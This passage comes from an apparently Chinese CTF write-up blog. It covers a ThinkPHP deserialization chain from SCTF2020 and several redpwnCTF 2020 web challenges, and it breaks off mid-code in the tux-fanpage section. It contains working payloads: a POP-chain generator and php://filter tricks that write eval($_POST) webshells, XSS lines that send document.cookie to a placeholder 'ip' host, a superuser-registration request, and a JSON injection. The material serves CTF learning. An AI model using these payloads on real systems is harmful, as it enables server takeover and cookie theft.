class="hljs-title">driver</span>\<span class="hljs-title">Memcached</span>;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Output</span></span>&#123;    <span class="hljs-keyword">private</span> <span class="hljs-variable">$handle</span> = <span class="hljs-literal">null</span>;    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$styles</span> = [];    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;        <span class="hljs-keyword">$this</span>-&gt;handle = <span class="hljs-keyword">new</span> Memcached();<span class="hljs-comment">//目的调用其write()</span>        <span class="hljs-keyword">$this</span>-&gt;styles = [<span class="hljs-string">&#x27;getAttr&#x27;</span>];    &#125;&#125;<span class="hljs-keyword">namespace</span> <span class="hljs-title">think</span>;<span class="hljs-comment">#Model</span><span class="hljs-keyword">use</span> <span class="hljs-title">think</span>\<span class="hljs-title">model</span>\<span class="hljs-title">relation</span>\<span class="hljs-title">HasOne</span>;<span class="hljs-keyword">use</span> <span class="hljs-title">think</span>\<span class="hljs-title">console</span>\<span class="hljs-title">Output</span>;<span class="hljs-keyword">use</span> <span class="hljs-title">think</span>\<span class="hljs-title">db</span>\<span class="hljs-title">Query</span>;<span class="hljs-keyword">abstract</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Model</span></span>&#123;    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$append</span> = [];    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$error</span>;    <span class="hljs-keyword">public</span> <span class="hljs-variable">$parent</span>;<span class="hljs-comment">#修改处</span>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$selfRelation</span>;    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$query</span>;    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$aaaaa</span>;    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;        <span class="hljs-keyword">$this</span>-&gt;parent = <span class="hljs-keyword">new</span> Output();<span class="hljs-comment">#Output对象,目的是调用__call()</span>        <span class="hljs-keyword">$this</span>-&gt;append = [<span class="hljs-string">&#x27;getError&#x27;</span>];        <span class="hljs-keyword">$this</span>-&gt;error = <span class="hljs-keyword">new</span> HasOne();<span class="hljs-comment">//Relation子类,且有getBindAttr()</span>        <span class="hljs-keyword">$this</span>-&gt;selfRelation = <span class="hljs-literal">false</span>;<span class="hljs-comment">//isSelfRelation()</span>        <span class="hljs-keyword">$this</span>-&gt;query = <span class="hljs-keyword">new</span> Query();    &#125;&#125;<span class="hljs-keyword">namespace</span> <span class="hljs-title">think</span>\<span class="hljs-title">db</span>;<span class="hljs-comment">#Query</span><span class="hljs-keyword">use</span> <span class="hljs-title">think</span>\<span class="hljs-title">console</span>\<span class="hljs-title">Output</span>;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Query</span></span>&#123;    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$model</span>;    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;        <span class="hljs-keyword">$this</span>-&gt;model = <span class="hljs-keyword">new</span> Output();    &#125;&#125;<span class="hljs-keyword">namespace</span> <span class="hljs-title">think</span>\<span class="hljs-title">session</span>\<span class="hljs-title">driver</span>;<span class="hljs-comment">#Memcached</span><span class="hljs-keyword">use</span> <span class="hljs-title">think</span>\<span class="hljs-title">cache</span>\<span class="hljs-title">driver</span>\<span class="hljs-title">File</span>;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Memcached</span></span>&#123;    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$handler</span> = <span class="hljs-literal">null</span>;    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;        <span class="hljs-keyword">$this</span>-&gt;handler = <span class="hljs-keyword">new</span> File();<span class="hljs-comment">//目的调用File-&gt;set()</span>    &#125;&#125;<span class="hljs-keyword">namespace</span> <span class="hljs-title">think</span>\<span class="hljs-title">cache</span>\<span class="hljs-title">driver</span>;<span class="hljs-comment">#File</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">File</span></span>&#123;    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$options</span> = [];    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$tag</span>;    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;        <span class="hljs-keyword">$this</span>-&gt;options = [            <span class="hljs-string">&#x27;expire&#x27;</span>        =&gt; <span class="hljs-number">0</span>,            <span class="hljs-string">&#x27;cache_subdir&#x27;</span>  =&gt; <span class="hljs-literal">false</span>,            <span class="hljs-string">&#x27;prefix&#x27;</span>        =&gt; <span class="hljs-string">&#x27;&#x27;</span>,            <span class="hljs-string">&#x27;path&#x27;</span>          =&gt; <span class="hljs-string">&#x27;php://filter/write=string.strip_tags|convert.iconv.utf-7.utf-8/resource=/var/www/html/public/nationalsb/+ADw?+AD0AQA-eval(+ACQAXw-POST+AFs-x+AF0)+ADs?+AD4-&#x27;</span>,            <span class="hljs-string">&#x27;data_compress&#x27;</span> =&gt; <span class="hljs-literal">false</span>,        ];        <span class="hljs-keyword">$this</span>-&gt;tag = <span class="hljs-literal">true</span>;    &#125;&#125;<span class="hljs-keyword">namespace</span> <span class="hljs-title">think</span>\<span class="hljs-title">model</span>;<span class="hljs-keyword">use</span> <span class="hljs-title">think</span>\<span class="hljs-title">Model</span>;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Pivot</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Model</span></span>&#123;&#125;<span class="hljs-keyword">use</span> <span class="hljs-title">think</span>\<span class="hljs-title">process</span>\<span class="hljs-title">pipes</span>\<span class="hljs-title">Windows</span>;<span class="hljs-keyword">echo</span> base64_encode(serialize(<span class="hljs-keyword">new</span> Windows()));</code></pre><p>有几种绕exit拼接的</p><pre><code class="hljs awk"><span class="hljs-comment"># 先过滤短标签，再utf-7转utf-8 </span><span class="hljs-comment"># 转编码可这样 var_dump(iconv(&#x27;utf-8&#x27;, &#x27;utf-7&#x27;, &#x27;asdas&#x27;)); </span>php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/write=string.strip_tags|convert.iconv.utf-7.utf-8/</span>resource=<span class="hljs-regexp">/var/</span>www<span class="hljs-regexp">/html/</span>public<span class="hljs-regexp">/nationalsb/</span>+ADw?+AD0AQA-eval(+ACQAXw-POST+AFs-x+AF0)+ADs?+AD4-<span class="hljs-comment"># utf-8转utf-7 再base64解码 </span>php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/convert.iconv.utf-8.utf-7|convert.base64-decode/</span>resource=aaaPD9waHAgQGV2YWwoJF9QT1NUWydjY2MnXSk7Pz4g<span class="hljs-regexp">/../</span>a.php<span class="hljs-comment"># UCS-2LE转UCS-2BE</span>php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">//</span>convert.iconv.UCS-<span class="hljs-number">2</span>LE.UCS-<span class="hljs-number">2</span>BE<span class="hljs-regexp">/resource=?&lt;hp pn$ma=e_$EG[Tf&quot;li&quot;e;]f$li=e_$EG[Td&quot;wo&quot;n;]ifelp_tuc_noettn(sn$ma,eifelg_tec_noettn(sf$li)e;)ihhgilhg_tifel_(F_LI_E)_?;a&gt;a/</span>../</code></pre><p><a href="https://cyc1e183.github.io/2020/04/03/%E5%85%B3%E4%BA%8Efile_put_contents%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B0%8F%E6%B5%8B%E8%AF%95/">https://cyc1e183.github.io/2020/04/03/%E5%85%B3%E4%BA%8Efile_put_contents%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B0%8F%E6%B5%8B%E8%AF%95/</a></p><h2 id="Jsonhub"><a href="#Jsonhub" class="headerlink" title="Jsonhub"></a>Jsonhub</h2><p>注册admin权限的用户</p><pre><code class="hljs json">&#123;<span class="hljs-attr">&quot;username&quot;</span>:<span class="hljs-string">&quot;wander1&quot;</span>,<span class="hljs-attr">&quot;password&quot;</span>:<span class="hljs-string">&quot;123&quot;</span>,<span class="hljs-attr">&quot;is_staff&quot;</span>:<span class="hljs-number">1</span>,<span class="hljs-attr">&quot;is_superuser&quot;</span>:<span class="hljs-number">1</span>,<span class="hljs-attr">&quot;is_active&quot;</span>: <span class="hljs-number">1</span>&#125;</code></pre><p><a href="https://github.com/SycloverSecurity/SCTF2020/tree/master/Web/Jsonhub/Write-up">https://github.com/SycloverSecurity/SCTF2020/tree/master/Web/Jsonhub/Write-up</a></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>SCTF2020</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>redpwnCTF 2020</title>
    <link href="/2020/06/30/redpwnCTF-2020/"/>
    <url>/2020/06/30/redpwnCTF-2020/</url>
    
    <content type="html"><![CDATA[<blockquote><p>国外的一场比赛，好多题没写出来，赛后这几天从github上下了dockerfile  复现学习一下</p><p><a href="https://github.com/redpwn/redpwnctf-2020-challenges">https://github.com/redpwn/redpwnctf-2020-challenges</a></p></blockquote><h2 id="web-static-pastebin"><a href="#web-static-pastebin" class="headerlink" title="web/static-pastebin"></a>web/static-pastebin</h2><blockquote><p>I wanted to make a website to store bits of text, but I don’t have any experience with web development. However, I realized that I don’t need any! If you experience any issues, make a paste and send it <a href="https://admin-bot.redpwnc.tf/submit?challenge=static-pastebin">here</a></p><p>Site: <a href="https://static-pastebin.2020.redpwnc.tf/">static-pastebin.2020.redpwnc.tf</a></p><p>Note: The site is entirely static. Dirbuster will not be useful in solving it.</p></blockquote><p>题目描述给了两个网址，一个类似代码高亮的纯静态页，一个提交网址xssbot会访问的网站，可以初步判断为xss打cookie</p><p>纯静态页面的话可以分析下js是这么过滤的</p><pre><code class="hljs javascript">(<span class="hljs-keyword">async</span> () =&gt; &#123;    <span class="hljs-keyword">await</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Promise</span>(<span class="hljs-function">(<span class="hljs-params">resolve</span>) =&gt;</span> &#123;        <span class="hljs-built_in">window</span>.addEventListener(<span class="hljs-string">&#x27;load&#x27;</span>, resolve);    &#125;);    <span class="hljs-keyword">const</span> content = <span class="hljs-built_in">window</span>.location.hash.substring(<span class="hljs-number">1</span>);    display(atob(content));&#125;)();<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">display</span>(<span class="hljs-params">input</span>) </span>&#123;    <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">&#x27;paste&#x27;</span>).innerHTML = clean(input);&#125;<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">clean</span>(<span class="hljs-params">input</span>) </span>&#123;    <span class="hljs-keyword">let</span> brackets = <span class="hljs-number">0</span>;    <span class="hljs-keyword">let</span> result = <span class="hljs-string">&#x27;&#x27;</span>;    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; input.length; i++) &#123;        <span class="hljs-keyword">const</span> current = input.charAt(i);        <span class="hljs-keyword">if</span> (current == <span class="hljs-string">&#x27;&lt;&#x27;</span>) &#123;            brackets ++;        &#125;        <span class="hljs-keyword">if</span> (brackets == <span class="hljs-number">0</span>) &#123;            result += current;        &#125;        <span class="hljs-keyword">if</span> (current == <span class="hljs-string">&#x27;&gt;&#x27;</span>) &#123;            brackets --;        &#125;    &#125;    <span class="hljs-keyword">return</span> result&#125;</code></pre><p>可以看出对<code>&lt;&gt;</code>包裹的会被过滤，单是先传入<code>&gt;</code>会导致 <code>brackets=-1</code>,后面传入<code>&lt; brackets=0</code>就不会被过滤  </p><pre><code class="hljs javascript">&gt;<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">x</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">alert(</span>&quot;<span class="hljs-attr">ddddddhm</span>&quot;);&gt;</span></span><span class="xml">// 打cookie</span>&gt;&lt;img src=x onerror=window.location.href=&#x27;https://ip/?c=&#x27;+document.cookie;&gt;</code></pre><p>可以用python开一个服务或nc收cookie</p><p><img src="https://s1.ax1x.com/2020/06/30/NIrEb4.png" alt="NIrEb4.png"></p><h2 id="web-panda-facts"><a href="#web-panda-facts" class="headerlink" title="web/panda-facts"></a>web/panda-facts</h2><blockquote><p>I just found a hate group targeting my favorite animal. Can you try and find their secrets? We gotta take them down!</p><p>Site: <a href="https://panda-facts.2020.redpwnc.tf/">panda-facts.2020.redpwnc.tf</a></p></blockquote><p>输入用户名即可登陆，登陆后提示 You are not a member</p><p><img src="https://s1.ax1x.com/2020/06/30/NIfmIU.png" alt="NIfmIU.png"></p><p>给了源码，瞧下源码</p><pre><code class="hljs javascript"><span class="hljs-built_in">global</span>.__rootdir = __dirname;<span class="hljs-keyword">const</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express&#x27;</span>);<span class="hljs-keyword">const</span> bodyParser = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;body-parser&#x27;</span>);<span class="hljs-keyword">const</span> cookieParser = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;cookie-parser&#x27;</span>);<span class="hljs-keyword">const</span> path = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;path&#x27;</span>);<span class="hljs-keyword">const</span> crypto = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;crypto&#x27;</span>);<span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;dotenv&#x27;</span>).config();<span class="hljs-keyword">const</span> INTEGRITY = <span class="hljs-string">&#x27;12370cc0f387730fb3f273e4d46a94e5&#x27;</span>;<span class="hljs-keyword">const</span> app = express();app.use(bodyParser.json(&#123; <span class="hljs-attr">extended</span>: <span class="hljs-literal">false</span> &#125;));app.use(cookieParser());app.post(<span class="hljs-string">&#x27;/api/login&#x27;</span>, <span class="hljs-keyword">async</span> (req, res) =&gt; &#123;    <span class="hljs-keyword">if</span> (!req.body.username || <span class="hljs-keyword">typeof</span> req.body.username !== <span class="hljs-string">&#x27;string&#x27;</span>) &#123;        res.status(<span class="hljs-number">400</span>);        res.end();        <span class="hljs-keyword">return</span>;    &#125;    res.json(&#123;<span class="hljs-string">&#x27;token&#x27;</span>: <span class="hljs-keyword">await</span> generateToken(req.body.username)&#125;);    res.end;&#125;);app.get(<span class="hljs-string">&#x27;/api/validate&#x27;</span>, <span class="hljs-keyword">async</span> (req, res) =&gt; &#123;    <span class="hljs-keyword">if</span> (!req.cookies.token || <span class="hljs-keyword">typeof</span> req.cookies.token !== <span class="hljs-string">&#x27;string&#x27;</span>) &#123;        res.json(&#123;<span class="hljs-attr">success</span>: <span class="hljs-literal">false</span>, <span class="hljs-attr">error</span>: <span class="hljs-string">&#x27;Invalid token&#x27;</span>&#125;);        res.end();        <span class="hljs-keyword">return</span>;    &#125;    <span class="hljs-keyword">const</span> result = <span class="hljs-keyword">await</span> decodeToken(req.cookies.token);    <span class="hljs-keyword">if</span> (!result) &#123;        res.json(&#123;<span class="hljs-attr">success</span>: <span class="hljs-literal">false</span>, <span class="hljs-attr">error</span>: <span class="hljs-string">&#x27;Invalid token&#x27;</span>&#125;);        res.end();        <span class="hljs-keyword">return</span>;    &#125;    res.json(&#123;<span class="hljs-attr">success</span>: <span class="hljs-literal">true</span>, <span class="hljs-attr">token</span>: result&#125;);&#125;);app.get(<span class="hljs-string">&#x27;/api/flag&#x27;</span>, <span class="hljs-keyword">async</span> (req, res) =&gt; &#123;    <span class="hljs-keyword">if</span> (!req.cookies.token || <span class="hljs-keyword">typeof</span> req.cookies.token !== <span class="hljs-string">&#x27;string&#x27;</span>) &#123;        res.json(&#123;<span class="hljs-attr">success</span>: <span class="hljs-literal">false</span>, <span class="hljs-attr">error</span>: <span class="hljs-string">&#x27;Invalid token&#x27;</span>&#125;);        res.end();        <span class="hljs-keyword">return</span>;    &#125;    <span class="hljs-keyword">const</span> result = <span class="hljs-keyword">await</span> decodeToken(req.cookies.token);    <span class="hljs-keyword">if</span> (!result) &#123;        res.json(&#123;<span class="hljs-attr">success</span>: <span class="hljs-literal">false</span>, <span class="hljs-attr">error</span>: <span class="hljs-string">&#x27;Invalid token&#x27;</span>&#125;);        res.end();        <span class="hljs-keyword">return</span>;    &#125;    <span class="hljs-keyword">if</span> (!result.member) &#123;        res.json(&#123;<span class="hljs-attr">success</span>: <span class="hljs-literal">false</span>, <span class="hljs-attr">error</span>: <span class="hljs-string">&#x27;You are not a member&#x27;</span>&#125;);        res.end();        <span class="hljs-keyword">return</span>;    &#125;    res.json(&#123;<span class="hljs-attr">success</span>: <span class="hljs-literal">true</span>, <span class="hljs-attr">flag</span>: process.env.FLAG&#125;);&#125;);app.use(express.static(path.join(__dirname, <span class="hljs-string">&#x27;/public&#x27;</span>)));app.listen(process.env.PORT || <span class="hljs-number">3000</span>);<span class="hljs-keyword">async</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">generateToken</span>(<span class="hljs-params">username</span>) </span>&#123;    <span class="hljs-keyword">const</span> algorithm = <span class="hljs-string">&#x27;aes-192-cbc&#x27;</span>;     <span class="hljs-keyword">const</span> key = Buffer.from(process.env.KEY, <span class="hljs-string">&#x27;hex&#x27;</span>);     <span class="hljs-comment">// Predictable IV doesn&#x27;t matter here</span>    <span class="hljs-keyword">const</span> iv = Buffer.alloc(<span class="hljs-number">16</span>, <span class="hljs-number">0</span>);    <span class="hljs-keyword">const</span> cipher = crypto.createCipheriv(algorithm, key, iv);    <span class="hljs-keyword">const</span> token = <span class="hljs-string">`&#123;&quot;integrity&quot;:&quot;<span class="hljs-subst">$&#123;INTEGRITY&#125;</span>&quot;,&quot;member&quot;:0,&quot;username&quot;:&quot;<span class="hljs-subst">$&#123;username&#125;</span>&quot;&#125;`</span>    <span class="hljs-keyword">let</span> encrypted = <span class="hljs-string">&#x27;&#x27;</span>;    encrypted += cipher.update(token, <span class="hljs-string">&#x27;utf8&#x27;</span>, <span class="hljs-string">&#x27;base64&#x27;</span>);    encrypted += cipher.final(<span class="hljs-string">&#x27;base64&#x27;</span>);    <span class="hljs-keyword">return</span> encrypted;&#125;<span class="hljs-keyword">async</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">decodeToken</span>(<span class="hljs-params">encrypted</span>) </span>&#123;    <span class="hljs-keyword">const</span> algorithm = <span class="hljs-string">&#x27;aes-192-cbc&#x27;</span>;     <span class="hljs-keyword">const</span> key = Buffer.from(process.env.KEY, <span class="hljs-string">&#x27;hex&#x27;</span>);     <span class="hljs-comment">// Predictable IV doesn&#x27;t matter here</span>    <span class="hljs-keyword">const</span> iv = Buffer.alloc(<span class="hljs-number">16</span>, <span class="hljs-number">0</span>);    <span class="hljs-keyword">const</span> decipher = crypto.createDecipheriv(algorithm, key, iv);    <span class="hljs-keyword">let</span> decrypted = <span class="hljs-string">&#x27;&#x27;</span>;    <span class="hljs-keyword">try</span> &#123;        decrypted += decipher.update(encrypted, <span class="hljs-string">&#x27;base64&#x27;</span>, <span class="hljs-string">&#x27;utf8&#x27;</span>);        decrypted += decipher.final(<span class="hljs-string">&#x27;utf8&#x27;</span>);    &#125; <span class="hljs-keyword">catch</span> (error) &#123;        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;    &#125;    <span class="hljs-keyword">let</span> res;    <span class="hljs-keyword">try</span> &#123;        res = <span class="hljs-built_in">JSON</span>.parse(decrypted);    &#125; <span class="hljs-keyword">catch</span> (error) &#123;        <span class="hljs-built_in">console</span>.log(error);        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;    &#125;    <span class="hljs-keyword">if</span> (res.integrity !== INTEGRITY) &#123;        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;    &#125;    <span class="hljs-keyword">return</span> res;&#125;</code></pre><p>关注到这一行</p><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> token = <span class="hljs-string">`&#123;&quot;integrity&quot;:&quot;<span class="hljs-subst">$&#123;INTEGRITY&#125;</span>&quot;,&quot;member&quot;:0,&quot;username&quot;:&quot;<span class="hljs-subst">$&#123;username&#125;</span>&quot;&#125;`</span></code></pre><p>把member伪造成1应该可以得到flag，token aes-192-cbc加密加密生成，也不知道密匙,因为密匙在环境变量中</p><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> key = Buffer.from(process.env.KEY, <span class="hljs-string">&#x27;hex&#x27;</span>);</code></pre><p>引入一个小知识点  JSON parsers会用最后一个值，也就是要是能在后面再构造一个为1的member就能覆盖掉</p><p><img src="https://s1.ax1x.com/2020/06/30/NI4eCF.png" alt="NI4eCF.png"></p><p>token哪username可控，尝试注入传入<code>gg&quot;,&quot;member&quot;:1,&quot;a&quot;:&quot;</code>,最后token变为 <code>&#123;&quot;integrity&quot;:&quot;1&quot;,&quot;member&quot;:0,&quot;username&quot;:&quot;gg&quot;,&quot;member&quot;:1,&quot;a&quot;:&quot;&quot;&#125;</code> ，flag到手</p><p><img src="https://s1.ax1x.com/2020/06/30/NI5EqI.png" alt="NI5EqI.png"></p><h2 id="web-static-static-hosting"><a href="#web-static-static-hosting" class="headerlink" title="web/static-static-hosting"></a>web/static-static-hosting</h2><blockquote><p>Seeing that my last website was a success, I made a version where instead of storing text, you can make your own custom websites! If you make something cool, send it to me <a href="https://admin-bot.redpwnc.tf/submit?challenge=static-static-hosting">here</a></p><p>Site: <a href="https://static-static-hosting.2020.redpwnc.tf/">static-static-hosting.2020.redpwnc.tf</a></p><p>Note: The site is entirely static. Dirbuster will not be useful in solving it.</p></blockquote><p>上面那题xss的升级版，也能看过滤的js代码</p><pre><code class="hljs javascript">(<span class="hljs-keyword">async</span> () =&gt; &#123;    <span class="hljs-keyword">await</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Promise</span>(<span class="hljs-function">(<span class="hljs-params">resolve</span>) =&gt;</span> &#123;        <span class="hljs-built_in">window</span>.addEventListener(<span class="hljs-string">&#x27;load&#x27;</span>, resolve);    &#125;);    <span class="hljs-keyword">const</span> content = <span class="hljs-built_in">window</span>.location.hash.substring(<span class="hljs-number">1</span>);    display(atob(content));&#125;)();<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">display</span>(<span class="hljs-params">input</span>) </span>&#123;    <span class="hljs-built_in">document</span>.documentElement.innerHTML = clean(input);&#125;<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">clean</span>(<span class="hljs-params">input</span>) </span>&#123;    <span class="hljs-keyword">const</span> template = <span class="hljs-built_in">document</span>.createElement(<span class="hljs-string">&#x27;template&#x27;</span>);    <span class="hljs-keyword">const</span> html = <span class="hljs-built_in">document</span>.createElement(<span class="hljs-string">&#x27;html&#x27;</span>);    template.content.appendChild(html);    html.innerHTML = input;    sanitize(html);    <span class="hljs-keyword">const</span> result = html.innerHTML;    <span class="hljs-keyword">return</span> result;&#125;<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">sanitize</span>(<span class="hljs-params">element</span>) </span>&#123;    <span class="hljs-keyword">const</span> attributes = element.getAttributeNames();    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; attributes.length; i++) &#123;        <span class="hljs-comment">// Let people add images and styles</span>        <span class="hljs-keyword">if</span> (![<span class="hljs-string">&#x27;src&#x27;</span>, <span class="hljs-string">&#x27;width&#x27;</span>, <span class="hljs-string">&#x27;height&#x27;</span>, <span class="hljs-string">&#x27;alt&#x27;</span>, <span class="hljs-string">&#x27;class&#x27;</span>].includes(attributes[i])) &#123;            element.removeAttribute(attributes[i]);        &#125;    &#125;    <span class="hljs-keyword">const</span> children = element.children;    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; children.length; i++) &#123;        <span class="hljs-keyword">if</span> (children[i].nodeName === <span class="hljs-string">&#x27;SCRIPT&#x27;</span>) &#123;            element.removeChild(children[i]);            i --;        &#125; <span class="hljs-keyword">else</span> &#123;            sanitize(children[i]);        &#125;    &#125;&#125;</code></pre><p>标签属性只能带<code>&#39;src&#39;, &#39;width&#39;, &#39;height&#39;, &#39;alt&#39;, &#39;class&#39;</code>,其他的属性全部移除掉，可以利用<code>iframe</code>构造</p><pre><code class="hljs javascript">&lt;iframe src=<span class="hljs-string">&quot;javascript:alert(1)&quot;</span>&gt;&lt;iframe src=<span class="hljs-string">&quot;javascript:top.location.href=&#x27;http://ip/?c=&#x27;+document.cookie&quot;</span>&gt;</code></pre><p>和上面一样传过去就有flag了</p><p>flag{wh0_n33d5_d0mpur1fy} </p><p>ps .在这里用window.location、self、this失败了，猜是不许页面内引入。 除了top还可以用parent代替</p><h2 id="web-tux-fanpage"><a href="#web-tux-fanpage" class="headerlink" title="web/tux-fanpage"></a>web/tux-fanpage</h2><blockquote><p>My friend made a fanpage for Tux; can you steal the source code for me?</p><p>Site: <a href="https://tux-fanpage.2020.redpwnc.tf/">tux-fanpage.2020.redpwnc.tf</a></p></blockquote><p>给了源码</p><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express&#x27;</span>)<span class="hljs-keyword">const</span> path = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;path&#x27;</span>)<span class="hljs-keyword">const</span> app = express()<span class="hljs-comment">//Don&#x27;t forget to redact from published source</span><span class="hljs-keyword">const</span> flag = <span class="hljs-string">&#x27;[REDACTED]&#x27;</span>app.get(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;    res.redirect(<span class="hljs-string">&#x27;/page?path=index.html&#x27;</span>)&#125;)app.get(<span class="hljs-string">&#x27;/page&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;    <span class="hljs-keyword">let</span> path = req.query.path    <span class="hljs-comment">//Handle queryless request</span>    <span class="hljs-keyword">if</span>(!path || !strip(path))&#123;        res.redirect(<span class="hljs-string">&#x27;/page?path=index.html&#x27;</span>)        <span class="hljs-keyword">return</span>    &#125;    path = strip(path)    path = preventTraversal(path)    res.sendFile(prepare(path), <span class="hljs-function">(<span class="hljs-params">err</span>) =&gt;</span> &#123;        <span class="hljs-keyword">if</span>(err)&#123;            <span class="hljs-keyword">if</span> (! res.headersSent) &#123;                <span class="hljs-keyword">try</span> &#123;                    res.send(strip(req.query.path) + <span class="hljs-string">&#x27; not found&#x27;</span>)                &#125; <span class="hljs-keyword">catch</span> &#123;                    res.end()                &#125;            &#125;        &#125;    &#125;)&#125;)<span class="hljs-comment">//Prevent directory traversal attack</span><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">preventTraversal</span>(<span class="hljs-params">dir</span>)</span>&#123;    <span class="hljs-keyword">if</span>(dir.includes(<span class="hljs-string">&#x27;../&#x27;</span>))&#123;        <span class="hljs-keyword">let</span> res = dir.replace(<span class="hljs-string">&#x27;../&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)        <span class="hljs-keyword">return</span> preventTraversal(res)    &#125;    <span class="hljs-comment">//In case people want to test locally on windows</span>    <span class="hljs-keyword">if</span>(dir.includes(<span class="hljs-string">&#x27;..\\&#x27;</span>))&#123;        <span class="hljs-keyword">let</span> res = dir.replace(<span class="hljs-string">&#x27;..\\&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)        <span class="hljs-keyword">return</span> preventTraversal(res)    &#125;    <span class="hljs-keyword">return</span> dir&#125;<span class="hljs-comment">//Get absolute path from relative path</span><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">prepare</span>(<span class="hljs-params">dir</span>)</span>&#123;    <span class="hljs-keyword">return</span> path.resolve(<span class="hljs-string">&#x27;./public/&#x27;</span> + dir)&#125;<span class="hljs-comment">//Strip leading characters</span><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">strip</span>(<span class="hljs-params">dir</span>)</span>&#123;    <span class="hljs-keyword">const</span> regex = <span class="hljs-regexp">/^[a-z0-9]$/im</span>    <span class="hljs-comment">//Remove first character if not alphanumeric</span>    <span class="hljs-keyword">if</span>(!regex.test(dir[<span class="hljs-number">0</span>]))&#123;        <span class="hljs-keyword">if</span>(dir.length &gt; <span class="hljs-number">0</span>)&#123;            <span class="hljs-keyword">return</span> strip(dir.slice(<span class="hljs-number">1</span>))        &#125;        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;</span>    &#125;    <span class="hljs-keyword">return</span> dir&#125;app.listen(<span class="hljs-number">3000</span>, <span class="hljs-function">() =&gt;</span> &#123;    <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&#x27;listening on 0.0.0.0:3000&#x27;</span>)&#125;)</code></pre><p>要求读文件，但是又很多过滤，一个一个看,首先是这个strip</p><pre><code class="hljs javascript"><span class="hljs-comment">//Strip leading characters</span><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">strip</span>(<span class="hljs-params">dir</span>)</span>&#123;    <span class="hljs-keyword">const</span> regex = <span class="hljs-regexp">/^[a-z0-9]$/im</span>    <span class="hljs-comment">//Remove first character if not alphanumeric</span>    <span class="hljs-keyword">if</span>(!regex.test(dir[<span class="hljs-number">0</span>]))&#123;        <span class="hljs-keyword">if</span>(dir.length &gt; <span class="hljs-number">0</span>)&#123;            <span class="hljs-keyword">return</span> strip(dir.slice(<span class="hljs-number">1</span>))        &#125;        <span 